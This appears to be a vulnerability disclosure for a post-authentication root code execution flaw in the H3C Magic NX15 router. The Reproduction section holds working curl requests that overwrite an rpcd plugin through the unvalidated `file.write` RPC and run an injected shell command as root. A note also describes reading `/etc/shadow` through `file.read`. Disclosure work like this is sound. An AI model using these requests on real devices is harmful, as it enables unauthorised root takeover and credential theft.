# Post-auth Root RCE via `file.write` overwriting an rpcd plugin

## Submission Type

- Category: CVE
- Language: English
- Product: H3C Magic NX15 Router
- Affected firmware: NX15V100R017 / R017
- Main report: `report/postauth_file_write_root_rce_report.md`
- PoC: `poc/postauth_file_write_root_rce.py`

## Classification

This issue is classified as CVE because it is an authenticated code execution
primitive: the `file.write` RPC method performs no path validation and runs in
the `rpcd` process as **root**, so it can overwrite `/usr/libexec/rpcd/*` — the
shell scripts that `rpcd` executes on behalf of the corresponding ubus objects.
Because `fopen(path, "w")` preserves the mode of an existing file, the
overwritten plugin remains executable (0755) and is executed with root
privileges the next time the object is invoked.

Verified end to end: after overwriting the plugin behind `esps.system.led` and
invoking that object, the injected command reported `uid=0(root) gid=0(root)`.

## Relationship to other disclosures

**This is not `CVE-2026-18900`.** That CVE concerns `file.exec`, a different RPC
method that exposes command execution directly. This finding instead abuses
`file.write` together with the plugins that `rpcd` already executes. No CVE
currently covers the `file.write` / `file.read` code paths.

It is also independent of the `usrlist` command injection reported in
`../usrlist_cmdi_root_rce/`; each can be exploited without the other.

## Reproduction

See `report/` for the full analysis and `poc/` for a runnable script.

```bash
T=$(curl -s -X POST -H 'Content-Type: application/json' \
      -d '{"username":"H3C","password":"<admin>"}' \
      http://<target>/api/login/auth | sed -n 's/.*"session":"\([^"]*\)".*/\1/p')

# overwrite the plugin (payload restores the original via the read-only /rom copy)
curl -s -X POST -H 'Content-Type: application/json' -H "AUTHENTICATION: $T" \
  -d '[{"id":1,"object":"file","method":"write","param":{
        "path":"/usr/libexec/rpcd/esps.system.led",
        "data":"#!/bin/sh\nid>/www/download/rce_proof.txt\nexec /bin/sh /rom/usr/libexec/rpcd/esps.system.led \"$@\"\n"}}]' \
  http://<target>/api/esps

# invoke the object -> rpcd executes the plugin as root
curl -s -X POST -H 'Content-Type: application/json' -H "AUTHENTICATION: $T" \
  -d '[{"id":1,"object":"esps.system.led","method":"get","param":{}}]' \
  http://<target>/api/esps
sleep 2
curl -s http://<target>/download/rce_proof.txt
# => uid=0(root) gid=0(root)
```

## Metrics

```text
CWE-73   External Control of File Name or Path
CWE-94   Improper Control of Generation of Code
CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H   (7.2)
```

## Notes

`file.read` has the same lack of path validation and runs as root; reading
`/etc/shadow` (mode 0600, owner root) succeeds. Both methods therefore operate
with more authority than their "file management" role suggests.

See [`../README.md`](../README.md) for the per-product index and how the primitives relate.
